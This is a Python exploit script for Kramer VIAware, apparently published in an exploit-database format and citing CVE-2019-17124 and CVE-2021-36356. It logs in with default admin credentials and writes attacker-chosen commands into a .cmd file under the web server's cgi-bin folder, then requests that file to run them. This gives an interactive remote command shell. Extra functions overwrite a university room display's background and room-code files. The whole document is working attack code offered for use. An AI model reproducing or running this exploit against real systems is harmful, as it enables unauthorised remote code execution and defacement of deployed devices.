# Exploit Title: Remote Code Execution KRAMER VIAware
# Date: 24/03/2022
# Exploit Author: sharkmoos & BallO
# Vendor Homepage: https://www.kramerav.com/
# Software Link: https://www.kramerav.com/us/product/viaware
# Version: 2.5.0719.1034
# Tested on: ViaWare Go (Windows 10)
# CVE : CVE-2019-17124, CVE-2021-36356
import requests, sys, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def adminLogin(s, host, username, password):
    """
        adminLogin- Takes in the session currently being run and the credential details allowing
        the admin to be logged in via cookies

        s - Current session
        host - The current host the kia is running on
        username - Username to login as
        password - Password for the user
    """
    #Takes in the headers from the burp request
    headers = {
        "Host": f"{host}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"https://{host}",
        "Referer": f"https://{host}/admin/login.php",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Connection": "close"
        }
    #Sends the credential details
    data = {
        "txtUserId": username,
        "txtPwd": password,
        "btnOk" :"Login"
        }
    #Requests and checks if the cookie has been logged
    response = s.post(f"https://{host}/admin/login.php", verify=False)
    if len(s.cookies) < 1:
        return False
    else:
        return True


def writeCommand(session, host, command):
    """
        writeCommand- Writes a command to file using a hidden field in the browser code (destination) and 
        saves that command (due to notepad.exe being installed) with a .cmd extension

        session - Current Session
        host - The current host the kia is running on
        command - The command to write into the .cmd file
    """
    headers = {
    "Host": f"{host}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Accept": "text/html, */*",
    "Accept-Language": "en-GB,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": f"https://{host}",
    "Referer": f"https://{host}/browseSystemFiles.php?path=C:\Windows&icon=browser",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Gpc": "1",
    "Te": "trailers",
    "Connection": "close"
    }
    #Write the command to the radioBtnVal value and the destination to associateFileName with
    #a known path C:/tc/httpd/cgi-bin/exploit.cmd
    data = {
        "radioBtnVal":f"{command}",
        "associateFileName": "C:/tc/httpd/cgi-bin/exploit.cmd"
        }
    session.post(f"https://{host}/ajaxPages/writeBrowseFilePathAjax.php", headers=headers, data=data)


def getResult(session, host):
    """
        getResult- Goes to the page where the file was saved to therefore allowing the code to execute and
        the result to be shown back in this terminal

        session - Current Session
        host - The current host the kia is running on
    """
    #Request the file location where the command is sent
    file = session.get(f"https://{host}/cgi-bin/exploit.cmd", verify=False)
    pageText = file.text
    #If the page length is less than 1 an error has occured and the file has not saved properly
    if len(pageText) < 1:
        result = "Command did not return a result"
    else:
        result = pageText
    return result



def main(host, username="su", password="supass"):
    """
        main- Takes in the session currently being run and credential details allowing
        the commands to written and finally executed with the results being shown

        host - The current host the kia is running on
        username - Username to login as
        password - Password for the user
    """
    #Request the session
    s = requests.Session()
    loggedIn = adminLogin(s, host, username, password)
    #Error message if unsucessful login attempt occurs
    if not loggedIn:
        print("Could not successfully login as the admin")
        sys.exit(1)
    else:
        pass

    command = ""
    #Constant loop of writing and re-writing commands to a file and the commands being executed
    while command != "exit":
        command = input("cmd:> ").strip()
        writeCommand(s, host, command)
        print(getResult(s, host))
    exit()


def theme(host, username="su", password="supass"):
    """
        theme- Takes in the session currently being run and credential details allowing
        the certian commands to be written and finally executed changing the theme background

        host - The current host the kia is running on
        username - Username to login as
        password - Password for the user
    """
    #Request the session
    s = requests.Session()
    loggedIn = adminLogin(s, host, username, password)
    #Error message if unsuccesful login attempt occurs
    if not loggedIn:
        print("Could not successfully login as the admin")
        sys.exit(1)
    else:
        pass
    #Sends the command to create a backup of the original theme and a second command to change the
    #background photo to a photo of your choice
    command1 = r'copy C:\tc\httpd\htdocs\uploads\Large\CoventryUniECB.jpg C:\tc\httpd\htdocs\uploads\Large\CoventryUniECB1.jpg'
    command2 = r'copy C:\VIAData\default.jpg C:\tc\httpd\htdocs\uploads\Large\CoventryUniECB.jpg'
    writeCommand(s, host, command1)
    writeCommand(s, host, command2)
    print(getResult(s, host))



def roomCode(host, username="su", password="supass"):
    """
        roomCode- Takes in the session currently being run and credential details allowing
        the certian commands to be written and finally executed changing the roome code, ip and colour

        host - The current host the kia is running on
        username - Username to login as
        password - Password for the user
    """
    #Request the session
    s = requests.Session()
    loggedIn = adminLogin(s, host, username, password)
    #Error message if unsuccesful login attempt occurs
    if not loggedIn:
        print("Could not successfully login as the admin")
        sys.exit(1)
    else:
        pass
    #Sends the command to create a backup of the original code name,ip and colour and a second command 
    #to change the current code name, ip and colour
    command1 = r'copy C:\tc\httpd\htdocs\templatedesigner\templates\CoventryUniECB.txt C:\tc\httpd\htdocs\templatedesigner\templates\CoventryUniECB1.txt'
    command2 = r'copy C:\VIAData\default.txt C:\tc\httpd\htdocs\templatedesigner\templates\CoventryUniECB.txt'
    writeCommand(s, host, command1)
    writeCommand(s, host, command2)
    print(getResult(s, host))



if __name__ == "__main__":
    """
        Take in the paramters and if any mismatch occurs, a help guide on what to type will be displayed

    """
    args = sys.argv
    numArgs = len(args)
    if  numArgs < 2:
        print(f"Run script in format:\n\n\tpython3 {args[0]} target\n")
        print(f"[Optional] Provide Admin Credentials\n\n\tpython3 {args[0]} target su supass")
        print(f"[Optional] Provide Admin Credentials\n\n\tpython3 {args[0]} target su supass tb")
        print(f"t- Theme text, b- Background photo")
    if numArgs == 2:
        main(args[1])
    if numArgs == 3:
        if (args[2] == "t"):
            theme(args[1])
        elif (args[2] == "b"):
            roomCode(args[1])
        elif (args[2] == "tb" or args[2] =="bt"):
            theme(args[1])
            roomCode(args[1])
    if numArgs == 4:
        main(args[1], args[2], args[3])
    if numArgs == 6:
        if (args[6] == "t"):
            theme(args[1], args[2], args[3])
        elif (args[6] == "b"):
            roomCode(args[1], args[2], args[3])
        elif (args[6] == "tb" or args[6] =="bt"):
            theme(args[1], args[2], args[3])
            roomCode(args[1], args[2], args[3])

    if numArgs > 6:
        print(f"Run script in format:\n\n\tpython3 {args[0]} target\n")
        print(f"[Optional] Provide Admin Credentials\n\n\tpython3 {args[0]} target su supass")
